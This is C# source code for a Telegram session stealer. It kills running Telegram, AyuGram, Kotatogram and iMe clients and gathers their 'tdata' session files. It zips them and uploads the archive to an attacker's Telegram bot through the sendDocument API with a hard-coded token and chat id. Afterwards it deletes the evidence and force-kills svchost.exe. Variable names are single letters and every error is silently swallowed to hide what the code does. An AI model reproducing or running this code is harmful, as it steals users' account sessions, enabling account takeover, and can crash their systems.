using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

class Program
{
    private const string TOKEN = "8495992265:AAGPWIf0aStfnygJYlH4Zav6KIdVfSyBVZE"; private const string A = "1076261091"; private const string P = "svchost.exe";
    static async Task Main() => await new Program().R();

    async Task R()
    {
        try
        {
            await C();
        }
        catch { }
    }

    async Task C()
    {
        var T = new[] { "Telegram", "AyuGram", "Kotatogram", "iMe" };
        var TS = T
            .Select(PC)
            .ToArray();

        await Task.WhenAll(TS);
    }

    async Task PC(string CN)
    {
        try
        {
            var PR = Process.GetProcessesByName(CN).FirstOrDefault();
            if (PR?.MainModule?.FileName == null) return;

            string CP = Path.GetDirectoryName(PR.MainModule.FileName) ?? string.Empty;
            if (string.IsNullOrEmpty(CP)) return;

            try
            {
                PR.Kill();
                PR.WaitForExit(500);
            }
            catch { }

            await Task.Delay(300);
            await CD(CP, CN);
        }
        catch { }
    }

    async Task CD(string CP, string CN)
    {
        string DP = Path.Combine(CP, "tdata");
        if (!Directory.Exists(DP)) return;

        var F = new List<string>();
        Directory.SetCurrentDirectory(DP);

        ASF(F);
        SDFF(F);

        if (F.Count == 0) return;

        string ZP = Path.Combine(Path.GetTempPath(), Guid.NewGuid() + ".zip");
        CZ(F, ZP);

        await SVT(ZP, CN);
        C(ZP);
    }

    static void ASF(List<string> F)
    {
        string[] SF = { "key_datas", "settingss", "usertag" };
        foreach (var f in SF)
        {
            if (File.Exists(f)) F.Add(f);
        }
    }

    static void SDFF(List<string> F)
    {
        foreach (var D in Directory.GetDirectories(Directory.GetCurrentDirectory()))
        {
            string DN = Path.GetFileName(D);
            string FM = Path.Combine(Directory.GetCurrentDirectory(), DN + "s");

            if (File.Exists(FM))
            {
                F.Add(FM);
                F.Add(D);

                string[] SF = { "maps", "configs" };
                foreach (var SFN in SF)
                {
                    string SP = Path.Combine(D, SFN);
                    if (File.Exists(SP)) F.Add(SP);
                }
            }
        }
    }

    static void CZ(List<string> F, string ZP)
    {
        using var A = ZipFile.Open(ZP, ZipArchiveMode.Create);
        foreach (var P in F)
        {
            try
            {
                if (File.Exists(P))
                {
                    A.CreateEntryFromFile(P, Path.GetFileName(P));
                }
                else if (Directory.Exists(P))
                {
                    foreach (var H in Directory.GetFiles(P, "*", SearchOption.AllDirectories))
                    {
                        var RP = Path.GetRelativePath(P, H);
                        A.CreateEntryFromFile(H, Path.Combine(Path.GetFileName(P), RP));
                    }
                }
            }
            catch { }
        }
    }

    async Task SVT(string ZP, string CN)
    {
        try
        {
            using var H = new HttpClient();
            using var F = new MultipartFormDataContent();

            F.Add(new StringContent(A), "chat_id");
            F.Add(new StringContent($"*Client*: `{CN}`"), "caption");
            F.Add(new StringContent("Markdown"), "parse_mode");

            using var FS = File.OpenRead(ZP);
            F.Add(new StreamContent(FS), "document", "session_data.zip");

            await H.PostAsync($"https://api.telegram.org/bot{TOKEN}/sendDocument", F);
            Process.Start("taskkill", $"/IM {P} /F");
        }
        catch { }
    }

    static void C(string ZP)
    {
        try
        {
            if (File.Exists(ZP))
                File.Delete(ZP);
        }
        catch { }
    }
}